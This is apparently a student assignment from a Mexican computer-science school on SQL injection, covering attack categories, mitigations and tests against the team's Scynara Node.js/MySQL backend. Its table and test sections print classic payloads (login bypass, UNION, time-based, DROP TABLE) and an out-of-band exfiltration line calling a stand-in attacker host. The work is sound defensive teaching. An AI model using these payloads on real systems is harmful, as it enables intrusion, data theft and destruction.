<div align="center">
  <img src="https://images.seeklogo.com/logo-png/7/2/ipn-logo-png_seeklogo-73340.png" align="left" width="90" alt="Logo IPN" />
  <img src="https://www.escom.ipn.mx/x/ee2021/images/galeriaEE2021/escudo_ESCOM.png" align="right" width="120" alt="Logo ESCOM" />
  
  <h2>Instituto Politécnico Nacional</h2>
  <h2>Escuela Superior de Cómputo</h2>

  <br><br><br><br>

  <b>Tarea</b><br>
  <b>Seguridad y Vulnerabilidades en Bases de Datos: SQL Injection</b>

  <br><br><br>

  <b>Alumno:</b><br><br>
  Olate Tomás Kevin Saúl<br>
  Garcia Peñalva Saúl 
  

  <br><br>

  <b>Profesor:</b><br>
  Gabriel Hurtado Avilés

  <br><br>

  <b>Unidad de Aprendizaje:</b><br>
  Bases de Datos

  <br><br>

  <b>Grupo:</b><br>
  3BV1

  <br><br>
</div>

---

# Tarea de SQL Injection

La presente tarea tiene como objetivo explorar los conceptos fundamentales de la inyección SQL (SQL Injection) y analizar su implementación en el proyecto Scynara. Para ello, se proporciona el backend de la aplicación, configurado para su despliegue en contenedores Docker, y se documenta el procedimiento de ejecución y validación mediante el uso de herramientas de prueba de APIs, como Postman y Thunder Client.

## Introducción 
En los años 90, cuando las páginas web comenzaron a ser interactivas y a conectarse directamente con las bases de datos, surgieron nuevos riesgos de seguridad. En ese contexto apareció la Inyección SQL, registrada por primera vez en 1998.

A pesar de todo lo que ha avanzado la tecnología y la programación desde entonces, esta amenaza no ha desaparecido. Hoy en día, prevenirla sigue siendo un requisito obligatorio y fundamental al desarrollar cualquier sistema que maneje información.

## ¿Qué es SQL Injection?
La Inyección SQL es un ataque que consiste en insertar código SQL malicioso directamente en los campos de entrada de datos de una aplicación, tales como formularios de inicio de sesión, barras de búsqueda o parámetros de la URL.  
Esta vulnerabilidad ocurre principalmente cuando un sistema no filtra, sanitiza ni valida adecuadamente la información ingresada por el usuario. Como resultado, cuando la aplicación procesa esta entrada, el motor de la base de datos recibe el código manipulado y lo ejecuta bajo la premisa de que es una instrucción legítima del sistema.  
En la práctica, este ataque se aprovecha de la mala costumbre de concatenar texto directamente en las consultas del backend. Al explotar esta falla, un atacante puede alterar la lógica original de la base de datos para evadir autenticaciones, extraer información confidencial o ejecutar comandos destructivos.

## Elementos Fundamentales de la Inyección SQL
Para que un ataque de inyección SQL se materialice, el sistema debe presentar deficiencias específicas en el procesamiento de la información. 
El ataque inicia cuando un actor malicioso inserta código manipulado en los campos de entrada de la aplicación, como los formularios de inicio de sesión o los parámetros de búsqueda. La vulnerabilidad crítica ocurre cuando el backend carece de una separación estricta entre la estructura de la consulta y los datos del usuario, tomando esta entrada y concatenándola directamente como texto plano sin un filtrado previo. En consecuencia, el motor de la base de datos recibe la cadena completa y ejecuta el código malicioso bajo la falsa premisa de que es una instrucción legítima del sistema.

Para que este engaño funcione en motores relacionales, los atacantes inyectan caracteres de control y palabras clave (como comillas simples ', signos de igual =, o guiones de comentario -- en el caso de MySQL) para alterar la estructura de la consulta original. El ejemplo más didáctico es la evasión de un login. Si el sistema espera credenciales, un atacante puede ingresar un texto manipulado como admin' -- en el campo de usuario. La comilla simple (') le indica a la base de datos que el texto del nombre ha terminado prematuramente, mientras que los guiones (--) le ordenan interpretar el resto de la consulta como un comentario, eliminando por completo la validación de la contraseña. Otra técnica fundamental es ingresar 1' OR '1'='1, lo cual fuerza a que la condición matemática sea siempre verdadera, otorgando acceso inmediato.

Una vez que se rompe la barrera entre "datos" e "instrucciones", el ataque evoluciona en diferentes variantes dependiendo de cómo el sistema devuelva la información. A continuación, se clasifican las formas más comunes:

| **Categoría** | **Técnica** | **Descripción** | **Ejemplo** | **Escenario en el Backend** |
|---|---|---|---|---|
| **In-Band** | **Basada en Errores** | El atacante introduce instrucciones SQL malformadas con el propósito de provocar errores controlados en el motor de base de datos. Los mensajes de error generados pueden revelar información sensible, como nombres de tablas, columnas, rutas del sistema, versiones del SGBD o detalles de la configuración interna. | `' OR 1=CONVERT(int,(SELECT @@version)) --` | Durante la ejecución de un CRUD de productos, una excepción no controlada genera un código HTTP 500 y expone el *stack trace* completo, revelando el nombre de la base de datos, el tipo de gestor utilizado y parte de la consulta ejecutada. |
| **In-Band** | **Basada en UNION** | Aprovecha el operador `UNION SELECT` para combinar el resultado de una consulta maliciosa con el de una consulta legítima. Para que el ataque sea exitoso, ambas consultas deben poseer el mismo número de columnas y tipos de datos compatibles. | `' UNION SELECT 1, version(), current_database() --` | En un ERP con arquitectura *multi-tenant*, un usuario con privilegios limitados intercepta la petición `GET /api/categorias?id=1` e inyecta una consulta `UNION` para obtener identificadores de inquilinos (`tenant_id`) y credenciales de otros administradores almacenadas en la base de datos. |
| **Inferencial** | **Basada en Booleanos** | Se presenta cuando la aplicación no muestra directamente los datos ni devuelve errores explícitos. El atacante inyecta expresiones lógicas que producen resultados verdaderos o falsos y analiza cambios sutiles en la respuesta HTTP, el contenido renderizado o el comportamiento de la aplicación para inferir información de la base de datos. | `1' AND (SELECT SUBSTRING(password,1,1) FROM usuarios WHERE id=1)='a' --` | Al manipular un endpoint de autenticación, la aplicación responde de manera distinta según la condición evaluada. Las variaciones en los mensajes o en el contenido de la respuesta permiten reconstruir datos sensibles carácter por carácter. |
| **Inferencial** | **Basada en Tiempo** | Similar a la técnica basada en booleanos, pero utilizada cuando la aplicación no presenta cambios visibles en sus respuestas. El atacante introduce funciones de retardo deliberado y mide el tiempo de respuesta del servidor para determinar si la condición inyectada fue evaluada como verdadera. | **MySQL:** `' OR IF(1=1, SLEEP(5), 0) --`<br><br>**PostgreSQL:** `' OR (SELECT pg_sleep(5)) IS NOT NULL --` | El payload se inserta en un proceso de normalización de datos. Si la respuesta del servidor presenta un retraso constante de cinco segundos, el atacante confirma la vulnerabilidad y procede a extraer información mediante consultas secuenciales basadas en tiempos de respuesta. |
| **Consultas Apiladas** | **Ataques Destructivos / DDL-DML** | Consiste en finalizar la consulta original mediante un punto y coma (`;`) y concatenar instrucciones adicionales, como `DROP`, `UPDATE`, `INSERT` o `DELETE`. Su viabilidad depende de las restricciones impuestas por el controlador de conexión y la configuración del motor de base de datos. | `1'); DROP TABLE categorias_crud; --` | En determinadas configuraciones de PostgreSQL, un uso incorrecto del controlador de acceso puede permitir la ejecución de múltiples sentencias en una sola petición. En consecuencia, un atacante podría modificar o eliminar datos críticos mediante instrucciones concatenadas. |
| **Out-of-Band** | **Exfiltración Externa** | Se emplea cuando no es posible obtener información mediante respuestas directas o técnicas inferenciales. El atacante induce al motor de base de datos a realizar comunicaciones externas, como consultas DNS o solicitudes HTTP, enviando los datos extraídos hacia un servidor bajo su control. | `'; EXEC master..xp_dirtree '//atacante.com/datos' --` *(SQL Server)* | Tras ejecutar el payload, el servidor de base de datos realiza una resolución DNS hacia un dominio controlado por el atacante, por ejemplo `password_robada.atacante.com`. El atacante posteriormente analiza los registros de su servidor para recuperar la información exfiltrada. |

> **Nota:** Las técnicas **In-Band** utilizan el mismo canal de comunicación de la aplicación para inyectar y recuperar información, las técnicas **Inferenciales** deducen los datos a partir del comportamiento del sistema y las técnicas **Out-of-Band** emplean canales externos de comunicación para la extracción de información.

**Mejores Prácticas de Mitigación**

La prevención de las vulnerabilidades de inyección SQL no depende de un único mecanismo de protección, sino de la implementación de una estrategia de **defensa en profundidad (*Defense in Depth*)**, en la que múltiples controles de seguridad operan de manera complementaria. Bajo este enfoque, si una capa de seguridad es comprometida, las restantes limitan el alcance del ataque y reducen significativamente su impacto.

Las siguientes prácticas constituyen las medidas fundamentales para prevenir y mitigar los ataques de SQL Injection en el desarrollo de *backends* modernos.

---

### Consultas Preparadas (*Parameterized Queries*)

Las consultas preparadas representan el mecanismo más eficaz y ampliamente recomendado para prevenir la inyección SQL. Su funcionamiento se basa en una separación estricta entre la lógica de la consulta y los datos proporcionados por el usuario.

En lugar de construir instrucciones SQL mediante concatenación de cadenas de texto, el motor de la base de datos compila primero la estructura de la consulta y, posteriormente, incorpora los valores recibidos en marcadores de posición (*placeholders*) previamente definidos. Como consecuencia, cualquier entrada enviada por el usuario es interpretada únicamente como un dato y nunca como una instrucción ejecutable.

De esta manera, intentos de inyección como `OR 1=1`, `UNION SELECT` o `DROP TABLE` son tratados como texto ordinario, impidiendo que modifiquen la consulta original.

**Ejemplos de implementación**

| **Entorno / Lenguaje** | **Implementación Vulnerable (Concatenación)** | **Implementación Segura (Parametrización)** |
|---|---|---|
| **Node.js + MySQL (`mysql2`)** | `const query = \`SELECT * FROM usuarios WHERE email = '${email_input}'\`;`<br>`connection.query(query, (err, res) => {...});` | `const query = 'SELECT * FROM usuarios WHERE email = ?';`<br>`connection.execute(query, [email_input], (err, res) => {...});` |
| **Python + PostgreSQL (`psycopg2`)** | `query = f"SELECT * FROM usuarios WHERE username = '{user_input}'"`<br>`cursor.execute(query)` | `query = "SELECT * FROM usuarios WHERE username = %s"`<br>`cursor.execute(query, (user_input,))` |

En las implementaciones seguras, el controlador de conexión (*driver*) recibe los parámetros por separado y realiza el tratamiento adecuado de los datos, evitando que sean interpretados como parte de la sentencia SQL.

---

### Principio de Menor Privilegio (*Least Privilege*)

Una arquitectura segura debe asumir que ninguna medida de protección es infalible. Por ello, las cuentas utilizadas por la aplicación para conectarse a la base de datos deben disponer exclusivamente de los permisos estrictamente necesarios para desempeñar sus funciones.

**Recomendaciones principales:**

- Utilizar credenciales específicas para cada módulo de la aplicación.
- Evitar el uso de cuentas administrativas globales, como `sa` o `postgres`.
- Conceder únicamente los permisos de lectura y escritura indispensables.
- Restringir la ejecución de instrucciones de definición de datos (DDL), tales como `DROP`, `ALTER`, `TRUNCATE` y `CREATE`.

La aplicación de este principio disminuye considerablemente el impacto potencial de un ataque exitoso, ya que limita las acciones que un atacante puede realizar sobre la base de datos.

---

### Validación y Sanitización Estricta de Entradas (*Whitelisting*)

La validación de datos constituye una capa adicional de protección que debe ejecutarse antes de que la información alcance la capa de acceso a datos (*Data Access Layer*). Su objetivo es garantizar que las entradas cumplan con el tipo, formato y restricciones previamente definidos por la aplicación.

**Validación de tipos de datos**

Si un *endpoint* espera un identificador numérico, el sistema debe verificar explícitamente que el valor recibido sea un entero válido.

**Solicitud esperada:**

```http
GET /api/categorias?id=1
```

**Intento de inyección:**

```http
GET /api/categorias?id=1 UNION SELECT password FROM usuarios
```

La petición debe rechazarse inmediatamente debido a que el parámetro recibido no cumple con el tipo de dato esperado.

**Uso de listas blancas (*Whitelisting*)**

Existen elementos de la consulta, como los nombres de columnas utilizados en `ORDER BY`, que no pueden parametrizarse directamente. En estos casos, la aplicación debe aceptar únicamente valores previamente autorizados.

```javascript
const columnasPermitidas = ['nombre', 'fecha', 'precio'];
```

**Solicitud válida:**

```http
GET /productos?sort=nombre
```

**Solicitud maliciosa:**

```http
GET /productos?sort=nombre; DROP TABLE productos
```

La segunda petición debe ser rechazada automáticamente, ya que el valor recibido no coincide con ninguno de los elementos definidos en la lista blanca.

---

### Manejo Seguro de Errores y Excepciones

Los mensajes de error producidos por la base de datos no deben exponerse directamente al cliente. La divulgación de excepciones, consultas SQL, nombres de tablas o versiones del gestor de base de datos proporciona información valiosa para un atacante durante las etapas de reconocimiento y explotación.

**Buenas prácticas recomendadas:**

- Registrar los errores detallados únicamente en archivos de *logs* internos.
- Devolver mensajes genéricos al usuario final.
- Evitar la exposición de *stack traces* y consultas SQL en las respuestas HTTP.

**Respuesta insegura:**

```text
ERROR: relation "usuarios" does not exist
```

**Respuesta recomendada:**

```text
Ha ocurrido un error al procesar la solicitud.
```

---

### Uso de ORM y Marcos de Acceso a Datos Seguros

Los marcos de persistencia de datos (*Object Relational Mapping - ORM*), como Hibernate, Sequelize, Entity Framework o SQLAlchemy, implementan mecanismos de parametrización de manera predeterminada.

Aunque su utilización no elimina completamente el riesgo de SQL Injection, sí reduce significativamente la probabilidad de introducir vulnerabilidades derivadas de la construcción manual de consultas mediante concatenación de cadenas.

Sin embargo, las consultas nativas (*Raw SQL Queries*) deben emplearse con precaución y respetando las mismas prácticas de parametrización, validación y control de permisos descritas anteriormente.

---

> **Idea clave:** La mitigación efectiva de SQL Injection requiere la combinación de múltiples controles de seguridad. Las consultas parametrizadas, el principio de menor privilegio, la validación estricta de entradas, el manejo seguro de errores y el uso adecuado de frameworks de acceso a datos constituyen un enfoque de defensa en profundidad que reduce drásticamente la superficie de ataque y fortalece la seguridad de las aplicaciones backend modernas.



**Prevención de SQL Injection en Backends Modernos**

En el desarrollo de software contemporáneo, la prevención de la inyección SQL ha dejado de depender exclusivamente de la disciplina del desarrollador al momento de escribir consultas individuales. Los *backends* modernos incorporan mecanismos de protección desde su diseño, apoyándose en herramientas de abstracción, arquitecturas desacopladas y controles de infraestructura que reducen significativamente la superficie de ataque.

La seguridad, por tanto, se concibe como una responsabilidad transversal que abarca desde la validación de las entradas hasta la configuración del entorno de despliegue.

---

### Uso de ORMs y Constructores de Consultas (*Query Builders*)

En la actualidad, el desarrollo de aplicaciones empresariales en entornos como Node.js, Python o Java se apoya ampliamente en el uso de Mapeadores Objeto-Relacionales (*Object-Relational Mappers, ORM*) y *Query Builders*, entre los que destacan Prisma, Sequelize, SQLAlchemy y TypeORM.

Estas herramientas abstraen la interacción con el motor de base de datos y permiten manipular los registros mediante objetos y métodos propios del lenguaje de programación, reduciendo la necesidad de escribir instrucciones SQL manualmente.

**Ventajas de seguridad**

- Generan consultas parametrizadas de forma automática.
- Evitan la construcción de sentencias mediante concatenación de cadenas.
- Reducen la probabilidad de introducir errores de programación asociados a SQL Injection.
- Favorecen la estandarización del acceso a los datos.

**Riesgo residual**

La mayoría de las vulnerabilidades de inyección SQL en aplicaciones modernas surgen cuando se omiten los mecanismos del ORM y se ejecutan consultas nativas (*Raw SQL Queries*) por razones de rendimiento, complejidad o flexibilidad. En estos escenarios, la responsabilidad de parametrizar adecuadamente las entradas vuelve a recaer directamente en el desarrollador.

---

### Arquitectura por Capas y Validación Centralizada

Los sistemas empresariales complejos, como plataformas *multi-tenant*, sistemas ERP o aplicaciones de Punto de Venta (POS), requieren un manejo estricto y consistente de los datos de entrada. Este objetivo se alcanza mediante arquitecturas desacopladas, tales como MVC, Arquitectura Hexagonal o Arquitectura Limpia (*Clean Architecture*), donde cada componente posee responsabilidades claramente definidas.

**Validación en la frontera de la aplicación**

Antes de alcanzar la lógica de negocio o la capa de persistencia, las solicitudes atraviesan mecanismos de validación centralizada implementados mediante *middlewares* o esquemas de validación.

Herramientas como:

- Zod
- Joi
- Pydantic

permiten definir reglas estrictas sobre el formato y tipo de los datos esperados.

Por ejemplo, si un servicio requiere el identificador numérico de una categoría, el esquema de validación puede exigir explícitamente un número entero. Si la entrada contiene expresiones SQL o datos incompatibles con el tipo esperado, la petición es rechazada inmediatamente, generalmente mediante una respuesta HTTP `400 Bad Request`.

**Aislamiento de la capa de acceso a datos**

La capa encargada de interactuar con la base de datos debe permanecer completamente desacoplada de las peticiones HTTP.

En una implementación adecuada:

1. La petición es recibida por el controlador.
2. Los datos son validados y transformados.
3. Solo la información previamente verificada se envía al repositorio.

Como consecuencia, el repositorio nunca procesa entradas sin validar ni objetos HTTP crudos, disminuyendo significativamente el riesgo de que datos maliciosos alcancen las consultas de la base de datos.

---

### Seguridad en la Infraestructura y Entornos Contenerizados

La contenerización mediante tecnologías como Docker no elimina las vulnerabilidades presentes en el código fuente; sin embargo, proporciona mecanismos de aislamiento que limitan considerablemente el impacto de un posible compromiso de seguridad.

**Aislamiento de red**

En un despliegue correctamente configurado, el contenedor de la base de datos no expone sus puertos directamente hacia el exterior. La comunicación se restringe exclusivamente a los servicios autorizados mediante redes virtuales internas.

Bajo este esquema:

- El cliente se comunica únicamente con la API.
- La API se comunica con la base de datos.
- La base de datos permanece inaccesible desde Internet.

Esta segmentación reduce la exposición de los servicios críticos y dificulta la explotación directa de la infraestructura.

**Gestión segura de credenciales**

Las credenciales de acceso a la base de datos no deben almacenarse dentro del código fuente ni incorporarse de forma estática en el repositorio del proyecto.

Las aplicaciones modernas utilizan mecanismos de configuración externa, tales como:

- Variables de entorno (`.env`)
- Sistemas de gestión de secretos (*Secrets Management*)
- Servicios de configuración centralizada

Este enfoque permite administrar credenciales con privilegios limitados y evita la exposición accidental de información sensible durante el desarrollo, la distribución del código o el despliegue de la aplicación.

---

> **Idea clave:** La prevención de SQL Injection en *backends* modernos no depende de un único mecanismo de seguridad. La combinación de ORMs con consultas parametrizadas, arquitecturas desacopladas con validación centralizada y configuraciones de infraestructura seguras constituye un enfoque integral de defensa en profundidad que reduce la probabilidad de explotación y limita el impacto de un eventual incidente de seguridad.



# Análisis e Implementación en el Proyecto Scynara

## Arquitectura y Configuración del Entorno 

El backend de Scynara está construido con **Node.js**, **Express** y **MySQL**. Su organización sigue una separación por capas que facilita ubicar dónde entra la petición, dónde se valida y dónde finalmente se ejecutan las consultas SQL:

- `src/routes/`: define los endpoints HTTP disponibles.
- `src/controllers/`: recibe la petición y delega la operación al servicio correspondiente.
- `src/services/`: aplica reglas de negocio, validaciones con Zod y control de errores.
- `src/models/`: concentra las consultas hacia MySQL usando `mysql2/promise`.
- `src/middlewares/`: contiene validación de JWT, roles, rate limiting y manejo global de errores.
- `src/config/`: centraliza la lectura de variables de entorno y la conexión a la base de datos.

Esta arquitectura ayuda a prevenir SQL Injection porque las entradas del usuario no se envían directamente desde el controlador a la base de datos. Antes pasan por esquemas de validación y después llegan a consultas parametrizadas.

Un ejemplo representativo se observa en el inicio de sesión. El flujo inicia en `POST /auth/login`, pasa por `loginUser`, valida el formato del correo y contraseña con `loginSchema`, y finalmente busca el usuario mediante una consulta parametrizada:

```javascript
const [rows] = await pool.query(
  `SELECT * FROM Usuarios WHERE correo = ? LIMIT 1`,
  [email]
);
```

El signo `?` funciona como marcador de posición. El valor de `email` se envía separado de la sentencia SQL, por lo que una entrada como `' OR '1'='1` no modifica la lógica del `WHERE`; se interpreta como texto.

En los módulos de productos, clientes, proveedores, ventas y usuarios se repite el mismo patrón de protección:

```javascript
await pool.query(
  'DELETE FROM Productos WHERE id_producto = ? AND id_tienda = ?',
  [id, tiendaId]
);
```

Además de parametrizar consultas, el proyecto usa **Zod** para controlar tipos, longitudes, formatos y valores permitidos. Por ejemplo, el esquema de productos exige que identificadores como `id_tienda`, `id_proveedor` e `id_categoria` sean números enteros positivos; de esta forma, payloads SQL enviados en campos numéricos son rechazados antes de llegar a MySQL.

El archivo `src/middlewares/error.middleware.js` también contribuye a la seguridad. En producción devuelve un mensaje genérico de error interno, evitando exponer detalles de consultas, stack traces o información del motor de base de datos al cliente.

### Ejecución con Docker

El backend puede ejecutarse en contenedores usando Docker Compose. La configuración incluye dos servicios:

- `api`: aplicación Node.js/Express expuesta en `http://localhost:3000`.
- `mysql`: base de datos MySQL 8.4 disponible únicamente dentro de la red interna de Docker.

Para levantar el proyecto:

```bash
cp .env.example .env
docker compose up --build
```

El contenedor de la API toma las variables de entorno desde `.env`. Como mínimo se requiere definir `JWT_SECRET`, `DB_USER`, `DB_PASSWORD` y `DB_NAME`; el archivo `.env.example` incluye valores de desarrollo para arrancar rápidamente.

Si se cuenta con un dump o script de creación de tablas, debe colocarse en `docker/mysql/init/` con extensión `.sql`. MySQL lo ejecutará automáticamente la primera vez que se cree el volumen `mysql_data`.

Comandos útiles:

```bash
docker compose ps
docker compose logs -f api
docker compose down
docker compose down -v
```

> `docker compose down -v` elimina también el volumen de MySQL, por lo que borra los datos almacenados en la base.

## Herramientas de Validación y Pruebas

Las pruebas de SQL Injection deben realizarse únicamente en el entorno local o en un ambiente autorizado. El objetivo de estas pruebas es comprobar que los controles implementados en el backend impiden alterar las consultas SQL mediante entradas maliciosas.

Para validar el proyecto se pueden utilizar:

- **Postman** o **Thunder Client** para enviar peticiones HTTP.
- **Docker Compose** para levantar la API y MySQL de forma aislada.
- **Logs de Docker** para observar errores controlados sin exponerlos al cliente.
- **MySQL Workbench**, DBeaver o la consola de MySQL para revisar que los datos no fueron modificados indebidamente.

### Preparación del entorno de pruebas

Primero se levanta el backend y la base de datos:

```bash
cp .env.example .env
docker compose up --build
```

Después se verifica que la API responda:

```http
GET http://localhost:3000/
```

Respuesta esperada:

```json
{
  "status": "API funcionando 🚀"
}
```

### Prueba 1: intento de evasión en login

El login es uno de los puntos clásicos para probar SQL Injection, ya que un ataque común intenta convertir la condición de autenticación en verdadera.

Solicitud:

```http
POST http://localhost:3000/auth/login
Content-Type: application/json
```

Cuerpo malicioso:

```json
{
  "email": "' OR '1'='1' --",
  "password": "cualquier-cosa"
}
```

Resultado esperado:

- La petición debe fallar con código `400` o `401`.
- No debe generarse un token JWT.
- No debe iniciarse sesión con ningún usuario.

Esto ocurre porque el campo `email` es validado por Zod como correo electrónico. Al no cumplir el formato esperado, la petición se rechaza antes de consultar la base de datos.

### Prueba 2: inyección en correo con formato aparentemente válido

También se puede probar una variante que incluye texto malicioso dentro de un valor que intenta parecer correo:

```json
{
  "email": "admin@scynara.com' OR '1'='1",
  "password": "cualquier-cosa"
}
```

Resultado esperado:

- La autenticación debe fallar.
- La consulta no debe devolver usuarios adicionales.
- El backend debe tratar todo el contenido del correo como un valor, no como parte de la sentencia SQL.

La protección principal en este caso es la consulta parametrizada:

```sql
SELECT * FROM Usuarios WHERE correo = ? LIMIT 1
```

El payload completo se compara contra la columna `correo`; no se concatena dentro del SQL.

### Prueba 3: inyección en parámetros de rutas protegidas

En endpoints como productos, clientes o proveedores, un atacante podría intentar manipular el parámetro `id`.

Solicitud de ejemplo:

```http
GET http://localhost:3000/products/1 OR 1=1
Authorization: Bearer <TOKEN_VALIDO>
```

Resultado esperado:

- La API no debe devolver todos los productos.
- La operación debe fallar o devolver un resultado vacío.
- No debe ejecutarse una consulta alterada por el parámetro.

En el modelo de productos, el identificador se envía como parámetro:

```javascript
WHERE p.id_producto = ? AND p.id_tienda = ?
```

Aunque el usuario modifique la URL, el valor recibido no se inserta como SQL ejecutable.

### Prueba 4: intento destructivo en un campo de texto

En formularios de creación o edición se puede probar una carga destructiva para confirmar que se almacena o rechaza como texto, pero no se ejecuta como instrucción SQL.

Ejemplo en nombre de producto:

```json
{
  "id_tienda": 1,
  "nombre": "Producto prueba'); DROP TABLE Productos; --",
  "cantidad": 10,
  "precio_caja": 100,
  "precio_unitario": 10
}
```

Resultado esperado:

- La tabla `Productos` no debe eliminarse.
- La aplicación no debe ejecutar `DROP TABLE`.
- Si el dato cumple las reglas del esquema, se tratará como texto; si no las cumple, será rechazado con error de validación.

### Prueba 5: validación de tipos en campos numéricos

Los campos numéricos son especialmente importantes porque suelen usarse en filtros, identificadores y relaciones.

Ejemplo:

```json
{
  "id_tienda": "1 OR 1=1",
  "nombre": "Caja de prueba",
  "cantidad": "10; DROP TABLE Productos;",
  "precio_caja": 100,
  "precio_unitario": 10
}
```

Resultado esperado:

- La petición debe ser rechazada por validación.
- `id_tienda` y `cantidad` no deben aceptarse como cadenas.
- La consulta SQL no debe ejecutarse con esos valores.

### Evidencias recomendadas

Para documentar la validación en el reporte, se recomienda capturar:

- Petición enviada en Postman o Thunder Client.
- Respuesta HTTP del backend.
- Código de estado recibido.
- Logs del contenedor de la API.
- Consulta o captura de la base de datos demostrando que las tablas siguen intactas.

Comando útil para revisar logs:

```bash
docker compose logs -f api
```

### Conclusión de las pruebas

Las pruebas muestran que el backend reduce el riesgo de SQL Injection mediante tres controles principales: validación estricta de entradas con Zod, consultas parametrizadas con `mysql2` y manejo de errores que evita filtrar información sensible en producción. Docker complementa estas medidas al aislar la API y la base de datos en servicios separados, manteniendo MySQL accesible únicamente dentro de la red interna del proyecto.
